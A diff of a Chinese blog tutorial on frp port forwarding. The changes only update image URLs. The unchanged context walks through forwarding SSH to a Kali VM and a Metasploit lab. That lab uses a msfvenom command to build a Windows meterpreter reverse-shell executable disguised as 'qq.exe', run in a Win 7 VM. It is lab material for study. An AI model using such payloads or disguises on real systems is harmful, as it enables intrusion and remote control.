@@ -29,7 +29,7 @@ updated: 2026-08-23 20:36:09
 
 在项目的 [0.41.0 发布页面](https://github.com/fatedier/frp/releases/tag/v0.41.0)找到 Linux amd64 安装包。截图对应的是本文使用的版本。
 
-![frp 0.41.0 发布页面中的 Linux amd64 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792085325/Typora/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png)
+![frp 0.41.0 发布页面中的 Linux amd64 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792696669/Typora/2026/08/65c0edabf7c4cf7b431c9f10ff94bc05.png)
 
 1. 在云服务器终端中下载：
 
@@ -37,7 +37,7 @@ updated: 2026-08-23 20:36:09
 wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz
 ```
 
-![在 Ubuntu 云服务器中下载 frp](https://res.cloudinary.com/sycamore/image/upload/v1792085323/Typora/2023/04/d8b546285137f60d42fef4a27a06d821.png)
+![在 Ubuntu 云服务器中下载 frp](https://res.cloudinary.com/sycamore/image/upload/v1792696670/Typora/2026/08/d8b546285137f60d42fef4a27a06d821.png)
 
 2. 解压下载的文件：
 
@@ -45,13 +45,13 @@ wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_
 tar -zxvf frp_0.41.0_linux_amd64.tar.gz
 ```
 
-![解压 frp 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792085323/Typora/2023/04/4063a698f14734b0fb54a92974122ba5.png)
+![解压 frp 安装包](https://res.cloudinary.com/sycamore/image/upload/v1792696672/Typora/2026/08/4063a698f14734b0fb54a92974122ba5.png)
 
 3. 输入 `cd frp_0.41.0_linux_amd64/`，进入解压后的目录。
 
 这个目录同时包含 frps 和 frpc。截图中删除了 frpc 相关文件，只保留服务端文件；这不是安装的必要步骤，保留它们也不会影响运行。
 
-![解压目录中保留的 frps 文件](https://res.cloudinary.com/sycamore/image/upload/v1792085317/Typora/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png)
+![解压目录中保留的 frps 文件](https://res.cloudinary.com/sycamore/image/upload/v1792696672/Typora/2026/08/f776553aeca109b5eef6a7e0d3d6bacd.png)
 
 ### 编写 frps 配置文件
 
@@ -69,7 +69,7 @@ dashboard_pwd = 123456
 
 `bind_port` 是 frps 与 frpc 通信的端口，`dashboard_port` 是监控页面的端口。下面两项是监控页面的登录账号和密码。
 
-![frps.ini 中的通信端口与监控页面配置](https://res.cloudinary.com/sycamore/image/upload/v1792085315/Typora/2023/04/02f8cca9459920e2f031c95fec4c172e.png)
+![frps.ini 中的通信端口与监控页面配置](https://res.cloudinary.com/sycamore/image/upload/v1792696678/Typora/2026/08/02f8cca9459920e2f031c95fec4c172e.png)
 
 截图里的 `123456` 只是实验使用的弱密码，不适合直接用于公网服务。启用监控页面时，应更换密码并限制访问来源；不使用时就关闭对应配置。
 
@@ -93,7 +93,7 @@ nohup ./frps -c frps.ini >/dev/null 2>&1 &
 
 服务端准备好后，接下来配置 Kali 中的客户端。下面的安装、配置和运行操作都在 Kali 虚拟机中完成。
 
-![实验使用的 Kali Linux 虚拟机](https://res.cloudinary.com/sycamore/image/upload/v1792085315/Typora/2023/04/692976286e5ddec8cd744326a1c3a54d.png)
+![实验使用的 Kali Linux 虚拟机](https://res.cloudinary.com/sycamore/image/upload/v1792696674/Typora/2026/08/692976286e5ddec8cd744326a1c3a54d.png)
 
 ### 下载安装
 
@@ -120,7 +120,7 @@ use_compression = true
 
 这里的 IP 是实验中的服务器地址。`server_port` 对应服务端的 `bind_port`；`[ssh]` 中的配置则把 Kali 的本地 SSH 服务映射到云服务器的 6666 端口。
 
-![frpc.ini 的 SSH 转发配置及注释](https://res.cloudinary.com/sycamore/image/upload/v1792085307/Typora/2023/04/2144e375ff1aca162bb41868d050259f.png)
+![frpc.ini 的 SSH 转发配置及注释](https://res.cloudinary.com/sycamore/image/upload/v1792696682/Typora/2026/08/2144e375ff1aca162bb41868d050259f.png)
 
 这张图中还包含后文的 `[msf]` 配置，本节只看 `[common]` 和 `[ssh]` 两部分。
 
@@ -148,7 +148,7 @@ RestartSec=20s
 WantedBy=multi-user.target
 ```
 
-![frpc 的 systemd 服务文件及注释](https://res.cloudinary.com/sycamore/image/upload/v1792470140/Typora/2026/10/20/frp-systemd-annotation.png)
+![frpc 的 systemd 服务文件及注释](https://res.cloudinary.com/sycamore/image/upload/v1792696677/Typora/2026/08/frp-systemd-annotation.png)
 
 本实验使用了下面几条服务管理命令，服务名 `frp` 对应文件名 `frp.service`：
 
@@ -164,19 +164,19 @@ WantedBy=multi-user.target
 
 虽然连接入口是云服务器，经过转发后实际登录的是 Kali，因此使用的是 Kali 的 SSH 账号。下面的连接结果也显示了 Kali 的系统信息。
 
-![通过映射端口连接到 Kali 的 SSH 测试结果](https://res.cloudinary.com/sycamore/image/upload/v1792085306/Typora/2023/04/52501488b9125c9518e2190783a8fcf4.png)
+![通过映射端口连接到 Kali 的 SSH 测试结果](https://res.cloudinary.com/sycamore/image/upload/v1792696681/Typora/2026/08/52501488b9125c9518e2190783a8fcf4.png)
 
 也可以在 Xshell 中创建会话，填写云服务器地址和映射端口：
 
-![Xshell 的连接地址和映射端口设置](https://res.cloudinary.com/sycamore/image/upload/v1792470145/Typora/2026/10/20/frp-xshell-port-annotation.png)
+![Xshell 的连接地址和映射端口设置](https://res.cloudinary.com/sycamore/image/upload/v1792696687/Typora/2026/08/frp-xshell-port-annotation.png)
 
 接着填写 Kali 的登录用户名和密码：
 
-![Xshell 的 Kali 登录账号设置](https://res.cloudinary.com/sycamore/image/upload/v1792470151/Typora/2026/10/20/frp-xshell-login-annotation.png)
+![Xshell 的 Kali 登录账号设置](https://res.cloudinary.com/sycamore/image/upload/v1792696687/Typora/2026/08/frp-xshell-login-annotation.png)
 
 保存并连接后，可以看到 Kali 的终端：
 
-![Xshell 成功连接 Kali](https://res.cloudinary.com/sycamore/image/upload/v1792085303/Typora/2023/04/7eed7e40069de144ddcfb74725077325.png)
+![Xshell 成功连接 Kali](https://res.cloudinary.com/sycamore/image/upload/v1792696686/Typora/2026/08/7eed7e40069de144ddcfb74725077325.png)
 
 ## msf 渗透攻击测试
 
@@ -194,7 +194,7 @@ local_port = 4444
 remote_port = 2333
 ```
 
-![frpc.ini 中新增的 msf 转发配置](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/75402a4aa7e5b6970ffb51313c0a847f.png)
+![frpc.ini 中新增的 msf 转发配置](https://res.cloudinary.com/sycamore/image/upload/v1792696686/Typora/2026/08/75402a4aa7e5b6970ffb51313c0a847f.png)
 
 ### msf 生成木马
 
@@ -204,13 +204,13 @@ remote_port = 2333
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe > qq.exe
 ```
 
-![生成测试文件 qq.exe 的终端截图](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/f72e4363a982738b25b5976722ab8948.png)
+![生成测试文件 qq.exe 的终端截图](https://res.cloudinary.com/sycamore/image/upload/v1792696690/Typora/2026/08/f72e4363a982738b25b5976722ab8948.png)
 
 ### msf 监听反弹的 shell
 
 本实验先让 frps、frpc 保持运行，再将测试文件传到 Win 7 x64 虚拟机。下图记录的是通过 Kali 的 Apache2 页面下载文件：
 
-![Win 7 虚拟机通过内网页面下载测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792085299/Typora/2023/04/79c8bcdd330dc38041cee9fa333d9bb8.png)
+![Win 7 虚拟机通过内网页面下载测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792696692/Typora/2026/08/79c8bcdd330dc38041cee9fa333d9bb8.png)
 
 监听端使用的命令如下：
 
@@ -225,8 +225,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333 -f exe 
 
 下面是 Win 7 中运行测试文件的截图：
 
-![在 Win 7 虚拟机中运行测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792085296/Typora/2023/04/553d087d53826c0f6f0bc2edf848b2b0.png)
+![在 Win 7 虚拟机中运行测试文件](https://res.cloudinary.com/sycamore/image/upload/v1792696694/Typora/2026/08/553d087d53826c0f6f0bc2edf848b2b0.png)
 
 监听端截图中出现了 Meterpreter 会话，并列出了桌面文件：
 
-![监听端建立 Meterpreter 会话的截图](https://res.cloudinary.com/sycamore/image/upload/v1792085295/Typora/2023/04/204ea56873200eb9b2507252955adb2a.png)
+![监听端建立 Meterpreter 会话的截图](https://res.cloudinary.com/sycamore/image/upload/v1792696695/Typora/2026/08/204ea56873200eb9b2507252955adb2a.png)
